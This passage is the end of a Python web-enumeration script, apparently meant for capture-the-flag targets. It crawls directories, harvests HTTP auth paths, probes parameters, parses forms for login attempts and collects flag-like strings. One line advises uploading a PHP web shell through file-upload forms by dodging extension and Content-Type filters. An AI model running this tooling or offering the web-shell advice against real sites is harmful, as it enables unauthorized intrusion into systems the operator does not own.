            if s7 == 200: save(a.out, f"{label}_{d.strip('/') or 'root'}.html", b7); analyse_page(label, d, s7, h7, b7, a.out)
            listing = s7 == 200 and b"Index of" in b7
            names = [l for l in re.findall(r'href="([^"?#]+)"', b7.decode("latin-1")) if not l.startswith(("/", "http", "..")) and l != "../"] if listing \
                else (INSIDE if d.endswith("/") and s7 in (200, 403) else [])
            if listing: note(f"[{label}] DIRECTORY LISTING {d}: {', '.join(names[:15])}")
            for n, (s8, h8, b8) in zip(names[:30], w.many([(d.rstrip("/") + "/" + n_, host) for n_ in names[:30]])):
                if s8 == 401: auth_paths.append((d.rstrip("/") + "/" + n, h8.get("Www-Authenticate", "")))
                if s8 == 200 and (listing or (s8, len(b8)) != miss) and len(b8) < 1_000_000:
                    save(a.out, f"{label}_{d.strip('/')}_{n}", b8); look_for_flags(f"{label} {d}{n}", b8)
                    if not listing: note(f"[{label}] found {d}{n} ({len(b8)} bytes)")
                    if len(b8) < 400 and b8.strip(): say(f"      {d}{n}: {b8.decode('latin-1').strip()[:200]}")

        # 3c2. HTTP basic/digest auth pages (the browser pop-up login)
        if auth_paths and not w.auth:
            basic_auth_analysis(w, label, host, auth_paths, " ".join(p_.decode("latin-1") for p_ in pages.values()), a)

        # 3d. parameters: light probes
        if params and not a.quick:
            for pth, q in list(params.items())[:5]: probe_params(w, label, host, pth, q)

        # 3e. forms
        for pth, f in forms[:4]:
            method = (re.search(r'method=["\']?(\w+)', f, re.I) or [None, "GET"])[1].upper()
            action = (re.search(r'action=["\']([^"\']*)["\']', f, re.I) or [None, pth])[1] or pth
            inputs = re.findall(r"<input[^>]*>", f, re.I)
            fields = {}
            for i in inputs:
                n = re.search(r'name=["\']?([^"\' >]+)', i, re.I)
                if n: fields[n.group(1)] = (re.search(r'value=["\']?([^"\'>]*)', i, re.I) or [None, ""])[1]
            fields.update({n: "" for n in re.findall(r'<(?:textarea|select)[^>]*name=["\']?([^"\' >]+)', f, re.I)})
            if not fields: continue
            note(f"[{label}] FORM {method} {action} fields: {', '.join(fields)}")
            if re.search(r'type=["\']?file', f, re.I):
                note(f"[{label}]   FILE UPLOAD form: try uploading shell.php (or .phtml/.php5, or shell.php.jpg, or change Content-Type to image/png), then find it under /uploads/")
            pw_f = next((n for n in fields if re.search(r"pass|pwd", n, re.I)), None)
            user_f = next((n for n in fields if re.search(r"user|login|email|name|uid", n, re.I) and n != pw_f), None)
            if method == "POST" and pw_f and user_f and not a.no_login:
                extra = {k: v for k, v in fields.items() if k not in (user_f, pw_f) and v}
                login_analysis(w, label, host, " ".join(p.decode("latin-1") for p in pages.values()), action, user_f, pw_f, extra, a.out)
            elif not a.quick:
                probe_params(w, label, host, action if action.startswith("/") else "/" + action,
                             {k: (v or "test") for k, v in fields.items()}, method="POST" if method == "POST" else "GET")

    say(f"    web requests sent on this port: {w.count}" + ("   (time limit reached)" if w.timed_out else ""))
    if FLAGS:
        say("    flag-looking strings from the web:")
        for k, v in FLAGS.items(): say(f"      {k}   ({v})")


if __name__ == "__main__":
    main()
